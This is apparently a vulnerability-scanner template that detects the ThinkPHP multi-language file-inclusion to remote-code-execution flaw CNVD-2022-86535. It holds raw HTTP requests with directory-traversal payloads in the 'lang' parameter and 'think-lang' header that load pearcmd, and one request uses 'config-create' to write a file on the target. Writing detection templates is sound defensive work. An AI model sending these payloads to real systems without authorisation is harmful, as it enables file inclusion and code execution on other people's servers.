id: CNVD-2022-86535

info:
  name: ThinkPHP 多语言功能文件包含及远程代码执行漏洞（CNVD-2022-86535）
  author: arliya,ritikchaddha
  severity: high
  description: |
    ThinkPHP 在开启多语言功能且 `lang` 参数过滤不严时，可能被利用加载 `pearcmd` 并进一步触发命令执行。模板结合 `think_lang` 回显与 `config-create` 成功信息，识别文件包含到远程代码执行链路是否可用。
  reference:
    - https://cn-sec.com/archives/1465289.html
    - https://blog.csdn.net/qq_60614981/article/details/128724640
    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-86535
  metadata:
    verified: true
    max-request: 3
  tags: cnvd,cnvd2022,thinkphp,rce,vuln

http:
  - raw:
      - |
        GET /?lang=../../../../../usr/local/php/pearcmd HTTP/1.1
        Host: {{Hostname}}
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        think-lang: ../../../../../usr/local/php/pearcmd
      - |
        GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/safedog()+{{rand_base(10)}}.log HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: set_cookie
        words:
          - "think_lang=..%2F..%2F..%2F..%2F"

      - type: word
        part: body_3
        words:
          - "CONFIGURATION"
          - "Successfully created"
        condition: and
